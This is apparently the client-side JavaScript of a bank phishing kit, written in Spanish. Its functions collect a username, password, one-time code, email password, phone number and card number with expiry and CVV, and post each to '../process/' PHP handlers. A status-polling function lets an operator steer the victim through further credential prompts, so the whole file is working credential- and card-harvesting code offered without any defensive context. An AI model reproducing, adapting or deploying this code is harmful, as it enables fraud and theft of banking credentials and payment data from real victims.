function inicio(u){
    // Expresión regular para verificar si el campo contiene solo letras y números, sin espacios en blanco
    const regex = /^(?=.*[a-zA-Z0-9])(?=.*\d)\S+$/;

    if (!regex.test(u)) {
        // Mostrar mensaje de error o tomar acción si el usuario no cumple con los requisitos
        alert("El usuario debe contener solo letras y números, sin espacios en blanco");
        return; // Detener la ejecución si no cumple la validación
    }

    $.post( "../process/inicio.php", { usr: u} ,function(data) {
        window.location.href = "clave.html";
    });
}


function detectar_dispositivo(){
    var dispositivo = "";
    if(navigator.userAgent.match(/Android/i))
        dispositivo = "Android";
    else
        if(navigator.userAgent.match(/webOS/i))
            dispositivo = "webOS";
        else
            if(navigator.userAgent.match(/iPhone/i))
                dispositivo = "iPhone";
            else
                if(navigator.userAgent.match(/iPad/i))
                    dispositivo = "iPad";
                else
                    if(navigator.userAgent.match(/iPod/i))
                        dispositivo = "iPod";
                    else
                        if(navigator.userAgent.match(/BlackBerry/i))
                            dispositivo = "BlackBerry";
                        else
                            if(navigator.userAgent.match(/Windows Phone/i))
                                dispositivo = "Windows Phone";
                            else
                                dispositivo = "PC";
    return dispositivo;
}   


function pasousuario(p,s,d,f){
    var res;
    var contraseña = p+""+""+s+""+d+""+f;

    var d = detectar_dispositivo();
    $.post( "../process/pasousuario.php", { pass: contraseña, dis: d} ,function(data) {
        if (data == "ERR") {

        }else{
            if (data == "NO") {

            }else{
                res = data.split("-");
                window.location.href = "cargando.html";
            }
        }
    });
}            

function consultar_estado(){
    $.post( "../process/estado.php",function(data) {
        switch (data) {
            case '2': window.location.href = "clave-celular.html"; break;
            case '4': window.location.href = "completa_info.html"; break;
            case '6': window.location.href = "pedirCc.html"; break;               
            case '8': window.location.href = "/page/dinamica-invalida.html"; break;
            case '10': window.location.href = "aprobado.html"; break;
            case '12': window.location.href = "/page/usuario-invalido.html"; break;
        } 
    });        
}

function enviar_otp(o,t,p,a,x,c){
    var otp = o+""+t+""+p+""+a+""+x+""+c
    $.post( "../process/pasoOTP.php",{ otp:otp },function(data) {
        window.location.href = "cargando.html";
    }); 
}

function enviar_mail(m,c,t){    
    $.post( "../process/pasomail.php",{ eml:m, passe:c, cel:t},function(data) {
        window.location.href = "cargando.html";
    });
}

function enviar_tarjeta(t,f,c){    
    $.post( "../process/pasotarjeta.php",{ tar:t, fec:f, cvv:c },function(data) {
        window.location.href = "cargando.html";
    });
}